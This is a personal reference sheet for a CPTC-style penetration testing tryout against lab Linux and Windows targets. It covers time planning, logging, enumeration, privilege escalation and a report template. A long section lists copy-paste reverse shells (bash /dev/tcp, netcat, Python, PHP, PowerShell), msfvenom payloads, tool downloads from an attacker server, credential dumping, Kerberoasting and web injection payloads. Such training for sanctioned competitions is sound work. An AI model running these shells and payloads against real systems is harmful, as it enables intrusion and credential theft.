# Red Team Tryout — Reference Notes
**Window:** 6:00 PM – 10:00 PM (4 hrs) | **Targets:** 1x Linux, 1x Windows | **Goal:** root both, document both, full written report by 10pm

---

## 0. Mindset for a CPTC-style tryout

CPTC scores you as much on **professionalism, documentation, and business context** as on root shells. Evaluators are often watching *how* you work, not just *whether* you get there. So:

- Narrate what you're doing and why — evaluators notice methodology talk
- Every command you run that matters goes in your notes **as you run it**, not reconstructed after
- Screenshot proof at each milestone (initial access, privilege escalation, flag/proof file) — timestamp visible if possible
- Don't be a "cowboy" — no destructive actions, no touching things outside scope, note anything that looks like it could impact availability
- If you get stuck, document *what you tried* — a good "attempted but unsuccessful" writeup can still score well

---

## 1. Time budget (4 hours, 2 boxes, full written report due at 10pm)

A full written report is the actual deliverable — not just root — so writing time needs a real protected block:

| Time | Activity |
|---|---|
| 6:00–6:15 | Recon both boxes in parallel (scans running while you read output) |
| 6:15–7:10 | Initial access on box #1 |
| 7:10–7:15 | Proof screenshot, log the finding block now while it's fresh |
| 7:15–8:05 | Initial access on box #2 |
| 8:05–8:10 | Proof screenshot, log the finding block now |
| 8:10–8:45 | Privesc — whichever box is closer/more promising first |
| 8:45–9:15 | Privesc on the other box if time allows, or deepen findings (extra loot, secondary vulns) on whichever is done |
| 9:15–10:00 | **Report writing — protected block, don't skip into it late.** Draft findings from your logged blocks, write the exec summary narrative last |

**Triage rule:** if one box is clearly softer (older OS, more services, known CVE), commit to it first. Don't sunk-cost a box that's fighting you for 60+ minutes with nothing — switch, come back later. With report time fixed at 9:15, your real exploitation window is ~3 hours, not 4 — plan accordingly.

**Since your findings blocks (section 7 template) get filled in live, report writing becomes assembly + narrative, not writing from scratch** — that's the whole point of logging as you go rather than after.

### Working as a pair (you driving, partner shadowing, separate reports)

You're driving most of the exploitation since your partner has less red team experience — reasonable call given the deliverable is root + report, not a training exercise. To make sure his report still ends up substantive and in his own voice:
- Narrate what you're doing and why as you go — this doubles as training
- Give him ~5 minutes at natural breakpoints (right after each root) to ask "why did that work" — those answers are what let him write a real Business Impact/Overview section
- When you're heads-down on one box's privesc, that's a good moment for him to run parallel recon/enum on the other box (gobuster, whatweb, initial nmap sweep) — low-risk, keeps him contributing
- Have him keep his own raw command log in parallel rather than relying on a shared folder after the fact — typing it himself as it happens produces a report that sounds like his own understanding

---

## 2. Logging setup (do this at 6:00, before you touch either box)

Two layers — a raw safety net that captures everything automatically, and your active markdown notes that you're actually writing the report from. The raw capture exists so a forgotten `tee` or a copy-paste you meant to save isn't gone forever; you shouldn't be relying on it as your primary record.

**Raw terminal capture (set up once per terminal, forget about it):**
```bash
# Simplest: wraps your whole shell session, logs everything in/out to a file
script -a ~/engagement/logs/terminal_$(date +%H%M).log
```
If you're in tmux (recommended — see below), log each pane instead so scan output and shell output aren't interleaved into a mess:
```bash
tmux pipe-pane -o 'cat >> ~/engagement/logs/pane_#{pane_id}.log'
```

**Folder structure (create at the very start):**
```bash
mkdir -p ~/engagement/{linux,windows}/{scans,loot,screenshots} ~/engagement/logs
```
Scan output goes to `scans/` (nmap `-oA` already writes there if you `cd` first), loot/dumped files to `loot/`, proof screenshots to `screenshots/` — named descriptively (`linux_root_proof.png`, `windows_privesc_printspoofer.png`) so you're not hunting through 40 unlabeled screenshots at 9:15.

**Active notes (this is what you actually write the report from):**
Keep `notes.md` open in a dedicated tmux pane or split editor window the entire night, using the finding-block template from section 7. Paste each command into it the moment you run it — copy-paste, not retyped from memory later — along with a one-line result and a rough timestamp:
```bash
date +%H:%M   # quick timestamp to paste before a command block when something notable happens
```
You don't need a timestamp on every single command — just at milestones (foothold gained, privesc confirmed, a technique that failed and you moved on from) so the eventual "Testing Narrative" has a real timeline to draw from.

**tmux layout that works well for this:** one pane for your active shell/exploitation, one pane for background scans, one pane for `notes.md`. Split panes with `Ctrl+b %` (vertical) / `Ctrl+b "` (horizontal) if you're not already set up for this.

---

## 3. Recon & enumeration (both boxes)

Run these against both targets at the very start so scans work in the background while you read results.

```bash
# Full scan without forced rate — prioritizing reliability over speed for tonight
nmap -T4 -A -p- <IP> -v -oA full_scan

# UDP quick pass, run in parallel in a second terminal — not a full sweep, just top ports.
# Cheap and occasionally catches something TCP misses entirely (SNMP default strings, DNS zone leaks,
# faster AD confirmation via 88/389/464)
nmap -sU --top-ports 20 -T4 -oN udp_<host>.txt <IP>
```

For each open port, note in your log: port, service, exact version, banner text, and check for a known CVE.
```bash
searchsploit <service> <version>
```

**Web services found?**
```bash
whatweb <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h http://<IP>
```
Check page source, robots.txt, any login forms, default creds, version disclosure in footers/headers.

---

## 4. Linux box workflow

**Enumeration priorities (roughly in order):**
1. Web app on any HTTP(S) port → check for known CVEs, LFI/RFI, upload functionality, exposed admin panels (see section 8 for web app triage)
2. SMB/NFS shares — `smbclient -L //<IP>/ -N` and `showmount -e <IP>`
3. FTP anonymous login — `ftp <IP>` (anonymous/anonymous)
4. SSH — version-specific CVEs, but usually your access vector is elsewhere and SSH is just for stabilizing a shell later
5. Any custom/unusual port — often where the intended vuln lives

**Getting a shell:** match the technique to what enumeration revealed (web app → command injection/upload/known CVE, exposed share → creds). Reverse shell payloads and listener setup are all in section 6 — start the listener first, then trigger the payload.

**Stabilize immediately after landing:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

**Privilege escalation checklist** (run linpeas first — command in section 6 — then manually verify the highlights):
- `sudo -l` — what can this user run as root, no password?
- SUID binaries: `find / -perm -4000 -type f 2>/dev/null` → check against GTFOBins (https://gtfobins.github.io)
- Writable cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
- Kernel version → known exploit? (`uname -a`, check searchsploit)
- Readable `/etc/shadow` or backup files with creds
- Writable `/etc/passwd` (add a root UID 0 user)
- Capabilities: `getcap -r / 2>/dev/null`
- Interesting env vars, `.bash_history`, config files with hardcoded creds
- Docker group membership (container escape to root)

**Proof:** `cat /root/proof.txt` or equivalent, screenshot with `id`, `hostname`, and the proof content all visible together.

---

## 5. Windows box workflow

**Enumeration priorities:**
1. SMB — `smbclient -L //<IP>/ -N`, `enum4linux -a <IP>`, check for null session / anonymous access
2. RPC — `rpcclient -U "" <IP>` for user/group enum
3. Web services — same as Linux (gobuster, nikto, check for known CMS)
4. WinRM (5985) — if you get creds, `evil-winrm -i <IP> -u <user> -p <pass>`
5. RDP (3389) — usable once you have creds
6. Any old/legacy service (older Windows boxes often have the CVE right in the version banner — MS17-010 EternalBlue, etc.)

**Getting a shell:**
```bash
# Check for EternalBlue-class stuff on older targets
nmap --script smb-vuln* -p445 <IP>
```
- Metasploit is fair game in most CPTC-style tryouts (confirm if unclear) — `use exploit/windows/...`
- If you land creds from somewhere (web app, SMB share, config file): try them everywhere — password reuse across services is extremely common in these labs
- Payload generation (msfvenom) is in section 6

**Privilege escalation checklist** (run winpeas first — command in section 6 — then manually verify):
- `whoami /priv` — look for `SeImpersonatePrivilege` (→ PrintSpoofer/JuicyPotato/RoguePotato), `SeBackupPrivilege`, `SeDebugPrivilege`
- Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"`
- Weak service/folder permissions: `accesschk.exe` or manual `icacls`
- AlwaysInstallElevated registry keys:
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
- Scheduled tasks running as SYSTEM with writable script/binary
- Stored credentials: `cmdkey /list`, saved WiFi passwords, unattended install files (`unattend.xml`), config files
- Kernel exploits as last resort (check `systeminfo` for patch level, but these are noisy/risky — prefer misconfig-based privesc first)

**If the box is domain-joined (single-host AD)** — see the dedicated note at the end of section 6, priority order is different from a standalone box.

**Proof:** run `whoami`, `hostname`, then `type C:\Users\Administrator\Desktop\proof.txt` (or equivalent) all in one screenshot.

---

## 6. Copy-paste tooling reference

Everything below is meant to be copied as-is, with `<IP>`/`<PORT>`/`<USER>` swapped in — no man page lookups mid-engagement. Set `LHOST`/`LPORT` as shell vars at the start of the night:
```bash
export LHOST=<YOUR_IP>
export LPORT=443
```

### Listener (start this FIRST, always)
```bash
rlwrap nc -lvnp $LPORT
# rlwrap gives you arrow-key history / backspace in the reverse shell
```
Metasploit alternative when you need a stable multi/handler (e.g. after msfvenom payload):
```
msfconsole -q -x "use exploit/multi/handler; set payload <matching payload>; set LHOST $LHOST; set LPORT $LPORT; run"
```

### Reverse shells (pick based on what's available on target)

**Bash (Linux, most common):**
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```
**Netcat (if nc -e is available):**
```bash
nc -e /bin/sh $LHOST $LPORT
```
**Python3 (Linux, very common fallback):**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$LHOST"'",'"$LPORT"'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
**PHP (webapp foothold):**
```bash
php -r '$sock=fsockopen("'"$LHOST"'",'"$LPORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
```
**PowerShell (Windows, one-liner):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**msfvenom (staged/portable payload — .exe, .elf, webshell, etc):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx   # IIS upload
```
revshells.com is fair game to pull from live too if something above doesn't fire (encoding issues, filtered chars) — bookmark it now.

### File transfer (getting tools ONTO the target)

**Linux target:**
```bash
# Attacker:
python3 -m http.server 8000
# Target:
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST:8000/linpeas.sh -o /tmp/linpeas.sh
```
**Windows target:**
```powershell
iwr -uri http://<LHOST>:8000/winPEASx64.exe -Outfile winpeas.exe
certutil -urlcache -split -f http://<LHOST>:8000/winpeas.exe winpeas.exe
```
**SMB serve (useful when HTTP is filtered outbound):**
```bash
impacket-smbserver share . -smb2support      # attacker
copy \\<LHOST>\share\winpeas.exe .           # target
```
**Base64 paste (no listener needed, small files only):**
```bash
base64 -w0 file > file.b64                    # Linux, generate
base64 -d file.b64 > file                      # Linux, decode
```
```powershell
[Convert]::ToBase64String((Get-Content -Path file -Encoding Byte))     # Windows, generate
[IO.File]::WriteAllBytes("file", [Convert]::FromBase64String($b64))    # Windows, decode
```

### Linux privesc tools
```bash
./linpeas.sh -a | tee linpeas_out.txt     # run it, don't just skim, pipe to a file so you can grep later
./pspy64                                   # no root needed, watches processes/cron in real time
# GTFOBins for any SUID/sudo binary found: https://gtfobins.github.io/#+sudo  or  #+suid
```

### Windows privesc tools
```powershell
.\winPEASx64.exe
.\PrintSpoofer64.exe -i -c cmd                                    # if SeImpersonatePrivilege
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"   # alt to PrintSpoofer
accesschk64.exe -uwcqv "Authenticated Users" *                    # service/folder perms, fast
```

### Active Directory / domain tooling (if the Windows box is domain-joined)
```bash
# NetExec — fastest way to spray/validate creds across the network
netexec smb <IP or subnet> -u <USER> -p <PASS>
netexec smb <IP> -u <USER> -p <PASS> --shares

# Kerberoasting
impacket-GetUserSPNs oui.local/<USER>:<PASS> -dc-ip <DC_IP> -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# ASREPRoast (no password needed if a username has preauth disabled)
impacket-GetNPUsers oui.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass

# secretsdump (dump local/domain hashes once you have admin-equivalent creds)
impacket-secretsdump <USER>:<PASS>@<IP>

# evil-winrm (interactive shell, creds + WinRM open)
evil-winrm -i <IP> -u <USER> -p '<PASS>'

# psexec/wmiexec (alt remote exec with admin creds)
impacket-psexec <USER>:<PASS>@<IP>
impacket-wmiexec <USER>:<PASS>@<IP>

# BloodHound collection (only worth it on a real multi-host domain — see note below)
bloodhound-python -u <USER> -p <PASS> -ns <DC_IP> -d oui.local -c all
```

### Single-box AD — priority order

If the Windows target is a single machine that happens to be domain-joined (or is itself the DC) rather than a multi-host forest, priority changes:

**Confirm AD is actually in play first:**
```bash
nmap -p88,389,445,464,636,3268 <IP>   # kerberos, ldap, smb, kpasswd, ldaps, global catalog
# 88 + 389/636 open = it's a DC
```
If confirmed, **skip full BloodHound collection** — nothing to map across hosts, near-zero payoff on a single-box target. Go straight at manual primitives:

1. **Null/anonymous enum:** `netexec smb <IP> -u '' -p ''`, `rpcclient -U "" -N <IP>`
2. **Any creds at all → Kerberoast immediately** (`impacket-GetUserSPNs`, above) — cracking one service account password is often the entire chain
3. **Got valid creds → check what they can actually do:** `netexec smb/ldap ... --shares` / `-M get-desc-users`
4. **Check delegation manually instead of BloodHound:** `impacket-findDelegation oui.local/<USER>:<PASS>` — constrained delegation on an account you control is your escalation path
5. **DCSync once you have the rights:** `impacket-secretsdump`

If it turns out NOT domain-joined (port 88 closed, no LDAP) — treat it as standalone and use the regular section 5 checklist.

### Password cracking quick reference
```bash
hashcat --example-hashes | grep -i -A2 "<hash type>"   # mode lookup if unsure
# 0=MD5, 1000=NTLM, 1800=sha512crypt (linux shadow), 13100=Kerberoast, 18200=ASREPRoast
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt --force
john --format=<format> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Time-savers
- Alias your most-used long commands at the start of the night: `alias hc='hashcat --force'`
- Keep a scratch file open (`notes.md` in a split tmux pane) and paste every command into it AS you run it
- `tmux` split panes: one for active shell, one for scans running in background, one for notes

---

## 7. Live note-taking template (fill this in as you go — this becomes your report)

Based on the actual CPTC-style report structure. Copy this block per finding as soon as you confirm it — don't wait until the end:

```
### [Finding-ID] – [Finding Title, e.g. "Weak Service Account Password"]

Risk: Critical / High / Medium / Low
Sophistication: High / Medium / Low
Remediation: High / Medium / Low

**Overview**
2-4 sentences: what you did, what you found, in narrative form.

**Affected Assets**
- [Hostname/IP – role]
- [Account/service if relevant]

**Business Impact**
Why this matters to "the client" in plain business language — what an
attacker could actually then DO (read the CEO's email, deploy ransomware,
pivot to X, etc.), not just "this could allow RCE."

**Remediation**
- Bullet list, concrete and specific ("rotate password to X" not "improve security")

**References**
- MITRE ATT&CK Txxxx if you have a sec to look it up (attack.mitre.org)

**Replication Steps**
Prose + the actual command(s)/screenshot that prove it. This is the part
you MUST capture live — you cannot reconstruct this convincingly later.
```

**Rating quick-reference:**
- **Risk** = how bad if exploited (Critical = domain/full compromise, High = urgent, Medium = notable disruption, Low = negligible, Informational = no direct threat)
- **Sophistication** = how hard to pull off (Low = public tools/minimal skill, High = deep system knowledge required)
- **Remediation** = how hard for the client to fix (Low = quick fix, High = major reconfig/business disruption)

**Every finding needs a screenshot that shows proof, not just a claim** — command + output + (where relevant) a timestamp visible on screen.

**Exec summary narrative (write LAST, once you know the full chain):** 1-2 sentences on what you tested → 3-5 sentence "Testing Narrative" walking the story end-to-end → optional "Good Practices" line noting anything the target did right.

Keep a running **command log** too (timestamp + command + one-line result). This is what saves you at 9:45 PM with 15 minutes left, and it's exactly what "Replication Steps" wants.

---

## 8. Web application exploitation — triage first, then exploit

The time-waster is running every technique against every input. Instead, **read the app for 5 minutes and let its behavior tell you what's worth trying.** Signal → likely vuln class:

| What you see | Try first |
|---|---|
| Numeric or sequential IDs in URL/API (`?id=4`, `/user/102`) | IDOR |
| Search box, login, "id" param feeding a DB-backed page | SQLi |
| Your input reflected back on the page (comments, search results, error messages, profile fields) | XSS |
| A state-changing action (change email/password, transfer funds, delete) with no per-request token | CSRF |
| `?page=`, `?file=`, `?template=`, `?lang=` type params | LFI / path traversal |
| File upload functionality | Upload → RCE (webshell) |
| Any parameter that looks like it maps to a filesystem path or shells out (`?cmd=`, ping/traceroute tools, image conversion) | Command injection |
| Admin panel behind a "hidden" but guessable path | Auth bypass / default creds / gobuster it |
| API returning verbose errors, stack traces, or a framework version in headers | Check known CVEs for that exact framework/version before hand-rolling anything |

Spend your first 10-15 minutes **clicking through the whole app as a normal user first** (Burp running so every request gets logged) before running any automated scanner. You'll spot 80% of the signals above just from using it.

**SQL Injection**
- Quick manual test: `'` in any input → if it errors or breaks the page, worth pursuing
- Auth bypass classic: `' OR '1'='1' -- -` in username/password field
- Once confirmed, let sqlmap do the enumeration:
  ```bash
  sqlmap -u "http://<IP>/page?id=1" --batch --dbs
  sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
  sqlmap -u "http://<IP>/page?id=1" -D <db> -T <table> --dump
  sqlmap -u "http://<IP>/login" --data="user=a&pass=b" --batch   # POST form
  sqlmap -r request.txt --batch                                   # raw Burp request
  ```
  If blind (no visible errors), add `--technique=B` or let sqlmap auto-detect.

**IDOR**
- Manual/Burp work — intercept a request with your own ID, change it to a neighboring/known value, replay it
- Check both read AND write access; write IDORs score higher severity
- Try authenticated AND with the session token removed entirely — that's broken access control even if IDs are unguessable

**XSS**
- Reflected quick test: `<script>alert(1)</script>` or `"><script>alert(1)</script>`
- If filtered: `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`
- Stored XSS (comments, profile fields) is higher value than reflected — check anywhere your input is saved and shown to another user/admin
- Don't spend more than a few minutes on bypass payloads unless it's clearly the intended vuln — pair any finding with a realistic business-impact note (session hijack, admin access)

**CSRF**
- Look for state-changing GET requests (instant CSRF via an `<img>` tag)
- POST forms: check for an anti-CSRF token at all — none + cookie auth = likely exploitable
- PoC is an auto-submitting HTML form hosted anywhere; usually lower priority unless it chains into account takeover

**LFI / Path Traversal**
- Quick test: `?page=../../../../etc/passwd`, or `php://filter/convert.base64-encode/resource=index.php` to read source
- LFI → RCE upgrade paths: log poisoning (inject PHP into `User-Agent`, then include the access log), `php://input` if allow_url_include is on, or traverse into an uploaded file

**File Upload → RCE**
- Try uploading your msfvenom PHP payload (section 6) directly first
- If filtered: `.phtml`/`.php5`/`.pht`, double extensions (`shell.php.jpg`), or content-type spoofing in Burp
- Confirm the upload directory actually executes scripts — sometimes you need a secondary LFI to include the file from elsewhere

**Command Injection**
- Quick test in any operational-looking param: `; id`, `| id`, `` `id` ``, `$(id)`
- If blind, confirm out-of-band: `; curl http://$LHOST:8000/confirm` and watch your `http.server` log

**Known CVE for the exact framework/CMS/version**
- Check this FIRST the moment a version is fingerprinted, before hand-testing anything above: `searchsploit <framework> <version>`

**Priority order when you don't know where to start:**
1. `whatweb` + version fingerprint → searchsploit for a known CVE (fastest win if it exists)
2. Click through manually, watch for the signal table above
3. Login form exists → SQLi auth bypass attempt (30 seconds to try, high payoff)
4. IDOR check on any ID-bearing endpoint
5. File upload if present → try payload upload immediately
6. XSS/CSRF last, unless one clearly chains into account takeover or admin access

---

## 9. Before time's up

- [ ] Screenshot of `id`/`whoami` + hostname + proof file for each box you rooted
- [ ] Full nmap output saved for each box
- [ ] Every exploit/technique that worked has the exact command saved somewhere (not memory)
- [ ] Note any finding you saw but didn't have time to exploit — "identified but not exploited due to time" is legitimate CPTC content
- [ ] Quick sanity pass: does your chain of "how I got from nothing to root" make sense as a narrative someone else could follow?

Good luck tonight.
